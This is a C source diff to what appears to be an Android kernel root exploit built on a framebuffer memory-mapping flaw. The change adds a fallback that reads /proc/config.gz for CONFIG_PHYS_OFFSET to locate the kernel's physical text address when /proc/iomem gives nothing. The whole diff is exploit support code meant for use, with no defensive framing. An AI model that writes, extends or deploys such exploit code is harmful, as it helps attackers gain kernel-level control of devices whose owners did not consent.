@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <zlib.h>
 
 #include "device_database/device_database.h"
 #include "libfb_mem_exploit/fb_mem.h"
@@ -6,6 +7,9 @@
 #include "kernel_memory.h"
 
 #define PTMX_MEMORY_MAPPED_ADDRESS      0x10000000
+
+#define CONFIG_SEARCH_STRING   "CONFIG_PHYS_OFFSET="
+#define CONFIG_SEARCH_LENGTH   (sizeof(CONFIG_SEARCH_STRING) - 1)
 
 static unsigned long int kernel_mapped_address;
 
@@ -19,6 +23,53 @@ void *
 convert_to_kernel_mapped_address(void *address)
 {
   return address - KERNEL_BASE_ADDRESS + kernel_mapped_address;
+}
+
+static unsigned long int
+find_kernel_text_from_config(void)
+{
+  unsigned long int kernel_ram = 0;
+  gzFile f;
+
+  f = gzopen("/proc/config.gz", "rb");
+  if (!f) {
+    return 0;
+  }
+
+  while (!gzeof(f)) {
+    char buffer[1024];
+    int len;
+
+    if (gzgets(f, buffer, sizeof (buffer) - 1) == Z_NULL) {
+      break;
+    }
+
+    buffer[sizeof(buffer) - 1] = '\0';
+
+    if (strncmp(buffer, CONFIG_SEARCH_STRING, CONFIG_SEARCH_LENGTH) == 0) {
+      char *p;
+
+      strtok(buffer + CONFIG_SEARCH_LENGTH, "\r\n");
+
+      kernel_ram = strtoul(buffer + CONFIG_SEARCH_LENGTH, &p, 0);
+      if (!*p) {
+	kernel_ram += 0x00008000;
+
+	printf("Detected kernel physical address at 0x%08x form config\n", kernel_ram);
+
+	gzclose(f);
+
+	return kernel_ram;
+      }
+
+      kernel_ram = 0;
+      break;
+    }
+  }
+
+  gzclose(f);
+
+  return kernel_ram;
 }
 
 static unsigned long int
@@ -65,7 +116,7 @@ find_kernel_text_from_iomem(void)
 
     kernel_ram += 0x00008000;
 
-    printf("Detected kernel physical address at 0x%08x\n", kernel_ram);
+    printf("Detected kernel physical address at 0x%08x form iomem\n", kernel_ram);
 
     return kernel_ram;
   }
@@ -85,6 +136,11 @@ setup_variables(void)
   }
 
   kernel_physical_offset = find_kernel_text_from_iomem();
+  if (kernel_physical_offset) {
+    return true;
+  }
+
+  kernel_physical_offset = find_kernel_text_from_config();
   if (kernel_physical_offset) {
     return true;
   }
